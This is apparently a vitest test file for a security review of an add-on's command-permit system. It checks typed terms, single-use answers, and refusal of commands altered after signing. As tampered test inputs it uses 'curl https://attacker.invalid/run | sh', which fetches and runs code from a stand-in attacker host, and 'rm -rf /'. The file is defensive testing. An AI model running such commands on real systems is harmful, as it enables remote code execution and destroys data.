// Security review #3, completed after the factory rewrite: a permit lets a command run, so its decision carries every
// execution value as typed terms, the action runs from those terms (never from live permit state), an answer is used
// once, and the host refuses a privilege-bearing decision (manifest `authorises: true`) that carries no terms.
import { describe, expect, it, vi } from 'vitest'
import { decisionBody } from '@/addon-ui/DecisionSignPrompt'
import type { AddonDecision } from '@/api/types'
import { getAddon } from '@/mocks/addons'
import { createMockStore } from '@/mocks/store'
import { installAndGrant } from '@/test/installAddon'

function setup() {
  const store = createMockStore({ persist: false })
  const ws = store.workspaces.find((w) => w.prefix === 'DEMO')!.id
  installAndGrant(store, ws, 'factory')
  const state = store.addonState(ws, 'factory') as { epic: string; permits: { id: string; command: string; ticket: string; state: string }[]; epicGrants: string[] }
  const permitDecision = () => store.addonDecisions(ws).find((d) => d.addon === 'factory' && d.action === 'permit')!
  return { store, ws, state, permitDecision }
}
const permitOf = (s: ReturnType<typeof setup>, d: AddonDecision) => s.state.permits.find((p) => `factory.permit:${p.id}` === d.id)!

describe('factory permits: typed terms, run from the terms, single use', () => {
  it('a permit decision carries the command, ticket, epic and scope as terms', () => {
    const s = setup()
    const d = s.permitDecision()
    const p = permitOf(s, d)
    expect(d.terms).toEqual({ command: p.command, ticket: p.ticket, epic: s.state.epic, scope: 'this exact command' })
  })
  it('the Codex replay: the command changed after the prompt opened is refused, with and without the digest', () => {
    const s = setup()
    const opened = structuredClone(s.permitDecision())
    const p = permitOf(s, opened)
    p.command = 'curl https://attacker.invalid/run | sh'
    const signed = decisionBody(opened, 'epic')
    expect(s.store.runAddon(s.ws, 'factory', 'permit', signed)).toMatchObject({ ok: false, status: 409, code: 'decision.closed' })
    const { digest: _d, ...bare } = signed
    expect(s.store.runAddon(s.ws, 'factory', 'permit', bare)).toMatchObject({ ok: false, status: 409 })
    expect(s.state.epicGrants).not.toContain(p.command)
    expect(p.state).toBe('open')
  })
  it('the action runs the command from the signed terms and refuses when live state disagrees', () => {
    const s = setup()
    const d = s.permitDecision()
    const p = permitOf(s, d)
    const permit = getAddon('factory')!.actions.permit
    const ctx = (decision: AddonDecision) => ({ store: s.store, ws: s.ws, viewer: 'p_sev', ticket: d.ticket, body: { id: d.id, option: 'epic' }, state: s.state as unknown as Record<string, unknown>, decision })
    // Live state moved underneath (as if core had matched an older decision): fail closed, nothing granted.
    const live = p.command
    p.command = 'rm -rf /'
    expect(permit(ctx(d))).toMatchObject({ ok: false, code: 'decision.closed' })
    expect(s.state.epicGrants).not.toContain('rm -rf /')
    p.command = live
    expect(permit(ctx(d))).toMatchObject({ ok: true })
    expect(s.state.epicGrants).toContain(d.terms!.command)
    expect(s.store.eventsOf(s.state.epic).at(-1)).toMatchObject({ type: 'factory.permit_granted', command: d.terms!.command, child: d.terms!.ticket })
  })
  it('an answer is used once: the same signed body again is refused', () => {
    const s = setup()
    const d = s.permitDecision()
    const body = decisionBody(d, 'once')
    expect(s.store.runAddon(s.ws, 'factory', 'permit', body)).toMatchObject({ ok: true })
    expect(s.store.runAddon(s.ws, 'factory', 'permit', body)).toMatchObject({ ok: false, status: 409, code: 'decision.closed' })
    expect(s.store.wsEventsOf(s.ws).filter((e) => e.type === 'addon.decided' && e.id === d.id)).toHaveLength(1)
  })
  it('the host refuses a privilege-bearing decision that carries no terms (manifest authorises: true)', () => {
    const s = setup()
    const mod = getAddon('factory')!
    const original = mod.decisions!.bind(mod)
    const spy = vi.spyOn(mod, 'decisions').mockImplementation((st, pkg, c) => original(st, pkg, c).map((x) => (x.action === 'permit' ? { ...x, terms: undefined } : x)))
    const d = s.permitDecision()
    expect(d.terms).toBeUndefined()
    expect(s.store.runAddon(s.ws, 'factory', 'permit', decisionBody(d, 'once'))).toMatchObject({ ok: false, status: 409, code: 'decision.terms_required' })
    expect(permitOf(s, d).state).toBe('open')
    spy.mockRestore()
  })
})
